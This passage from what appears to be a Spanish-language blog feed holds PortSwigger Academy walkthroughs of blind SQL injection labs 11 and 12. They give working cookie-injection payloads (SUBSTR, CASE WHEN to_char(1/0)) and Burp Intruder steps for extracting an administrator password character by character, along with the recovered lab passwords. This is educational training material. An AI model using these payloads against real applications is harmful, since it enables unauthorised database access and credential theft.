&lt;p&gt;Luego agregaremos el payload para que acepte numeros e ir probando uno por uno para posteriormente analizar el resultado. El&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 107; 
			flex-basis: 257px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intrudernumero.png&#34; data-size=&#34;679x633&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intrudernumero.png&#34;
			width=&#34;679&#34;
			height=&#34;633&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intrudernumero_hu80b5d77c54ae8ac1832cc712103eb1d5_23225_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intrudernumero_hu80b5d77c54ae8ac1832cc712103eb1d5_23225_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Payloads con valores numericos&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Payloads con valores numericos&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y finalmente haremos un grep en la respuesta ya que si recibimos la palabra &lt;code&gt;welcome back&lt;/code&gt; es porque ese es el tamano de la contrasena. Si&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 91; 
			flex-basis: 220px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intrudergrep.png&#34; data-size=&#34;582x634&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intrudergrep.png&#34;
			width=&#34;582&#34;
			height=&#34;634&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intrudergrep_hu9ac373880bb471e69b435a9f66b71f59_23449_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intrudergrep_hu9ac373880bb471e69b435a9f66b71f59_23449_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Grep de la respuesta recibida&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Grep de la respuesta recibida&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y ejecutando el ataque podemos ver que la contrasena tiene un tamano de 20.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 226; 
			flex-basis: 542px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intruderataque.png&#34; data-size=&#34;638x282&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intruderataque.png&#34;
			width=&#34;638&#34;
			height=&#34;282&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intruderataque_hu4752a7340756880c225e42211dfa93af_11255_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intruderataque_hu4752a7340756880c225e42211dfa93af_11255_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Ataque realizado&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Ataque realizado&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;tomar-los-datos-del-usuario-administrator&#34;&gt;Tomar los datos del usuario administrator&lt;/h4&gt;
&lt;p&gt;Sabiendo ya el tamano ya podemos proceder a tomar la contrasena del usuario administrator, para eso inyectaremos la siguiente solicitud:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;TrackingId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xxxxxxxxxxxxxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select substr(password,1,1) from users where username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;administrator&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;SUBSTR: Son 3 valores los que espera que serian&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Variable: Puede ser nombre de tabla, string, nombre de columna&lt;/li&gt;
&lt;li&gt;Segundo valor: A este se le indica desde donde quiere que se empiece a tomar en cuenta, &lt;code&gt;este es el que ira cambiando&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Tercero: Cuantos valores quiere que se imprima, en este caso &lt;code&gt;solo queremos 1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;Para el uso de texto enviaremos peticiones con valores del abecedario y valores numericos, para eso es mejor utilizar la siguiente &lt;!-- raw HTML omitted --&gt;lista de caracteres alfanumericos&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;Y ahora vamos a intruder y configuramos de la siguiente manera, de forma de cluster bomb para enviar 2 parametros y que pruebe todas las combinaciones.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;NOTA: En las capturas se muestra el valor alfanumerico sin comillas simples, por lo cual se debe de colocar&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 342; 
			flex-basis: 822px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbomb.png&#34; data-size=&#34;1576x460&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbomb.png&#34;
			width=&#34;1576&#34;
			height=&#34;460&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbomb_hua655820cd74765bac212c73336190a65_67102_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbomb_hua655820cd74765bac212c73336190a65_67102_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Configuracion de posicion&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Configuracion de posicion&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora a configurar los payloads tanto del valor 1 como del 2:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 113; 
			flex-basis: 273px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbombpayload1.png&#34; data-size=&#34;692x608&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbombpayload1.png&#34;
			width=&#34;692&#34;
			height=&#34;608&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbombpayload1_hu2babaf2b0848eebc433521a7ad660fff_22272_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbombpayload1_hu2babaf2b0848eebc433521a7ad660fff_22272_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Configuracion de payload 1&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Configuracion de payload 1&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 145; 
			flex-basis: 350px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbombpayload2.png&#34; data-size=&#34;706x484&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbombpayload2.png&#34;
			width=&#34;706&#34;
			height=&#34;484&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbombpayload2_hu52f56d3113064eaca38d0bc564f3a569_18807_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbombpayload2_hu52f56d3113064eaca38d0bc564f3a569_18807_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Configuracion de payload 2&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Configuracion de payload 2&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y en este caso ya hemos obtenido los resultados, solamente queda unirlos para entrar como el usuario &lt;code&gt;administrator&lt;/code&gt; que quedaria con el password &lt;code&gt;inpxkyrid4icz30lq1v8&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 300; 
			flex-basis: 721px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterataque.png&#34; data-size=&#34;842x280&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterataque.png&#34;
			width=&#34;842&#34;
			height=&#34;280&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterataque_hu05fbb61956efdbb8c27f281e91ac76ce_16719_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterataque_hu05fbb61956efdbb8c27f281e91ac76ce_16719_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Ataque con cluster bomb&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Ataque con cluster bomb&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 274; 
			flex-basis: 658px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/resuelto.png&#34; data-size=&#34;1699x619&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/resuelto.png&#34;
			width=&#34;1699&#34;
			height=&#34;619&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/resuelto_hu2f090387252526eb72ea54d57dfdca59_56387_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/resuelto_hu2f090387252526eb72ea54d57dfdca59_56387_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/alphanum-case.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Caracteres alfanumericos&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 12</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/</link>
        <pubDate>Sat, 06 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 12" /&gt;&lt;h1 id=&#34;-lab-blind-sql-injection-with-conditional-errors&#34;&gt;# Lab: Blind SQL injection with conditional errors&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer la contrasena de la tabla &lt;code&gt;users&lt;/code&gt; del usuario &lt;code&gt;administrator&lt;/code&gt;. Ademas se indica que esta utilizando en el backend Oracle por lo cual procederemos a buscar la informacion sobre este.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Al abrir la aplicacion vemos que ya no se comporta como en el Lab11 lo que nos permitia que segun la respuesta devuelta por el servidor saber si la consulta que realizabamos era true o false.&lt;/p&gt;
&lt;p&gt;Ahora lo que se puede hacer es inyectar una consulta SQL que nos genere ese error a proposito para saber si la consulta es true o false y el error terminara dando un error en el servidor y nos guiaremos por eso. Y ya que sabemos que es un backend Oracle haremos la siguiente prueba a inyectar en la cookie&lt;/p&gt;
&lt;p&gt;En este caso inyectaremos la siguiente peticion:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;xxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; AND (SELECT CASE WHEN (1=2) THEN to_char(1/0) ELSE &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; END FROM dual)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;muestra&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;la&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pagina&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;normal&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; AND (SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; END FROM dual)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;muestra&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;un&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;de&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;servidor&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lo que hace practicamente es que se cumpla la condicion de la cookie y luego la dentro del select genera un propio error que nos dira si es true o false segun la condicion que queramos, en este caso de prueba se valida con &lt;code&gt;1=1&lt;/code&gt; o &lt;code&gt;1=2&lt;/code&gt; aqui genera error del servidor solo si se cumple como pasa con la condicion &lt;code&gt;1=1&lt;/code&gt;, practicamente es un codigo que en cualquier lenguaje de programacion se ve, por ultimo si la condicion no es correcta como la salida sera &lt;code&gt;&#39;a&#39;&lt;/code&gt; solo valida que sea igual a la ultima a ingresada &lt;code&gt;&#39;a&lt;/code&gt; con una sola comilla al inicio para que la ultima la agregue el propio sistema a la que le colocaria a la cookie.&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;h4 id=&#34;recuperar-tamano-de-contrasena&#34;&gt;Recuperar tamano de contrasena&lt;/h4&gt;
&lt;p&gt;Como en el laboratorio anterior tocara saber el tamano de la contrasena y para eso utilizaremos la siguiente consulta inyectada:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;xxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; AND (SELECT CASE WHEN ((select length(password) from users where username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;administrator&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;)=20) THEN to_char(1/0) ELSE &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; END FROM dual)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Esta inyeccion hace validar el tamano de la contrasena, si la contrasena tiene el tamano que se le indica hara que la aplicacion genere un error &lt;code&gt;500&lt;/code&gt; en el servidor de &lt;code&gt;Internal Server Error&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 214; 
			flex-basis: 515px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/positions.png&#34; data-size=&#34;1136x529&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/positions.png&#34;
			width=&#34;1136&#34;
			height=&#34;529&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/positions_hu8ffc86b7f7277a11e0ab0ae97ff0a112_74882_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/positions_hu8ffc86b7f7277a11e0ab0ae97ff0a112_74882_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Payload a enviar el ataque por intruder&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Payload a enviar el ataque por intruder&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Al valor se le hara una peticion de 1 hasta 30 para saber cual es el tamano de la contrasena y como se muestra la aplicacion genera un error &lt;code&gt;500&lt;/code&gt; con el payload 20 lo que significa que la contrasena tiene 20 caracteres.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 282; 
			flex-basis: 676px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/payloads.png&#34; data-size=&#34;784x278&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/payloads.png&#34;
			width=&#34;784&#34;
			height=&#34;278&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/payloads_hu3826db709bb7e645db59686da8152161_11835_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/payloads_hu3826db709bb7e645db59686da8152161_11835_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Ataque con intruder&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Ataque con intruder&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;recuperar-la-contrasena&#34;&gt;Recuperar la contrasena&lt;/h4&gt;
&lt;p&gt;Ahora que sabemos el tamano ya podemos enviar la peticion para recuperarla, ahora para recuperar la contrasena utilizaremos la siguiente consulta para inyectar:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;xxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; AND (SELECT CASE WHEN ((select SUBSTR(password, 1, 1) from users where username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;administrator&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;) THEN to_char(1/0) ELSE &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; END FROM dual)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora vamos a realizar un ataque de clusterbomb enviando en el primer parametro el valor que cambiara de 1 a 20 y en el segundo un caracter alfanumerico.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 201; 
			flex-basis: 483px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/clusterbomb.png&#34; data-size=&#34;1140x566&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/clusterbomb.png&#34;
			width=&#34;1140&#34;
			height=&#34;566&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/clusterbomb_hu06f5bcfe4a95f0b61d1ee23c79eba140_74895_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/clusterbomb_hu06f5bcfe4a95f0b61d1ee23c79eba140_74895_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Ataque de cluster bomb&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Ataque de cluster bomb&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y al terminar el ataque podemos notar que los que dan un error 500 del lado servidor son donde la condicion fue true y toca tomar toda esa informacion para formar la contrasena:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 186; 
			flex-basis: 446px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/ataque.png&#34; data-size=&#34;771x414&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/ataque.png&#34;
			width=&#34;771&#34;
			height=&#34;414&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/ataque_hu285ec21bee2f135b85cb64b0006de933_18437_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/ataque_hu285ec21bee2f135b85cb64b0006de933_18437_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Resoyestas del ataque con error de respuesta 500&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Resoyestas del ataque con error de respuesta 500&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Al finalizar y formar la contrasena seria &lt;code&gt;gt4dyzmn4weyzcdog1n1&lt;/code&gt; y podemos iniciar sesion en la aplicacion para completar el laboratorio&lt;/p&gt;
&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 206; 
			flex-basis: 494px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/resuelto.png&#34; data-size=&#34;1786x866&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/resuelto.png&#34;
			width=&#34;1786&#34;
			height=&#34;866&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/resuelto_huf13eac2c8bbf1e3d9abbc64039f0280d_94807_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/resuelto_huf13eac2c8bbf1e3d9abbc64039f0280d_94807_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 8</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/</link>
        <pubDate>Sat, 06 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 8" /&gt;&lt;h1 id=&#34;lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft&#34;&gt;Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft&lt;/h1&gt;
